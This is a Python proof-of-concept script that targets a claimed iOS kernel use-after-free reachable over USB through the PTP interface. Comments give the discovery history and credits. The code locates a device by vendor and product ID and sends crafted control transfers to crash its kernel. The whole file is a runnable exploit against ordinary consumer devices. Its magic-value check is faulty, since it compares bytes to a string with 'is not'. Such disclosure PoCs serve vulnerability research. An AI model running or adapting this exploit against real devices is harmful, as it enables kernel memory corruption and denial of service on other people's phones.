#!/usr/bin/env python3
import sys
import time
import usb.core
import binascii

# The Bug was first discovered back in 2017 by @userlandkernel when both VMWare and Microsoft® Windows tried to get a USB control for PTP.
# The Bug was then reported to Apple in 2018 by @userlandkernel and @posixninja aside of eachother, both discovered this issue.
# Apple did not take any effort to patch this vulnerability
# Joshua Hill (@posixninja) then suspected this bug to be in PTP, an old image transfer protocol
# Sem Voigtländer (@userlandkernel) then decided to fuzz the protocol through random USB packets while intercepting the stream with Wireshark
# Raz Mashat then succeeded in triggering the vulnerability through interface 5 of the fuzzer
# He then forensically analyzed what packet caused the crash and wrote this PoC.
# From analyzing the crashlogs we now know that the crash must have been the result of a Use After Free. 
# Though accross different devices and iOS versions the corruption occurs in different parts with different faulting codes.
# That may mean that more bugs are present in the same interface, triggered the same way.

def banner():
  print('PoC for iOS Kernel UaF, reachable through USB by @RazMashat, contributions from @userlandkernel')
  print('Original bug by @userlandkernel and @posixninja')
  print('Copyright © All rights reserved, Minerva Mobile Security & Joshua Hill')
  print(' ')

def setup():
  sys.tracebacklimit = 0 #to hide info
  
def usage():
  print('Example usage: ./poc.py 05ac:12a8')
  
def poc(device):
	print('Preparing the first read...')

	res = ""
	rt = 0
	r = 0x6
	v = 0x30c
	i = 0x409
	size = 0xa
	size1= 0x64

	print('Reading for the first time...')
	res = device.ctrl_transfer(rt|0x80, r, v, i, size,timeout=250) #should always return 40035000540050002000
	res = binascii.hexlify(res)
	if res is not "40035000540050002000":
		print("Magic returned is not PTP? PoC might fail.")
	print('First read done. PoC should succeed now if the PTP magic got returned: ')
  
	try:
		res = device.ctrl_transfer(rt|0x80, r, v, i, size1,timeout=250)
	except Exception as e:
		print('Caught USB error, which is normal. Just re-attach the device.')

	print('PoC done deattach device')
  
def main():
  setup()
  banner()

  if len(sys.argv) <= 1:
    usage()
    exit()
    
  arg = sys.argv[1].split(':')
  
  if len(arg) <= 1:
  	usage()
  	exit()

  vid = int(arg[0], 16)
  pid = int(arg[1], 16)
  
  print('Looking for the USB Device...')
  
  device = usb.core.find(idVendor=vid, idProduct=pid)
  if device is not None:
    print('Found the specified device')
  else:
    print('Could not find the device specified ('+str(hex(vid))+', '+str(hex(pid))+').')
    print('Please make sure to specify VID:PID correctly.')
    exit()

  poc(device)

if __name__ == "__main__":
	main()
